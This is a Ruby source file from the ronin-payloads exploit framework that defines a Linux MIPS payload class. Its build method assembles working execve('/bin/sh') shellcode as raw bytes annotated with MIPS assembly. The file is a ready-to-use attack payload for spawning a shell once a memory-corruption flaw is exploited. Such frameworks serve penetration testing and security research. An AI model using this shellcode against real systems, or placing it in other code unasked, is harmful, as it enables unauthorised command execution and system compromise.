# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/exec_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module MIPS
          #
          # Linux MIPS shellcode that calls `execve()` with `/bin/sh`.
          #
          class ExecShell < ExecShellPayload

            register 'shellcode/linux/mips/exec_shell'

            arch :mips
            os :linux

            author "rigan", email: 'imrigan@gmail.com'

            summary 'Linux MIPS execve() shellcode'
            description <<~DESC
              Linux MIPS shellcode that calls execve() with "/bin/sh".
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-792.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x28\x06\xff\xff".b + # slti    a2,zero,-1
                         "\x3c\x0f\x2f\x2f".b + # lui     t7,0x2f2f
                         "\x35\xef\x62\x69".b + # ori     t7,t7,0x6269
                         "\xaf\xaf\xff\xf4".b + # sw      t7,-12(sp)
                         "\x3c\x0e\x6e\x2f".b + # lui     t6,0x6e2f
                         "\x35\xce\x73\x68".b + # ori     t6,t6,0x7368
                         "\xaf\xae\xff\xf8".b + # sw      t6,-8(sp)
                         "\xaf\xa0\xff\xfc".b + # sw      zero,-4(sp)
                         "\x27\xa4\xff\xf4".b + # addiu   a0,sp,-12
                         "\x28\x05\xff\xff".b + # slti    a1,zero,-1
                         "\x24\x02\x0f\xab".b + # li      v0,4011
                         "\x01\x01\x01\x0c".b   # syscall 0x40404
            end

          end
        end
      end
    end
  end
end
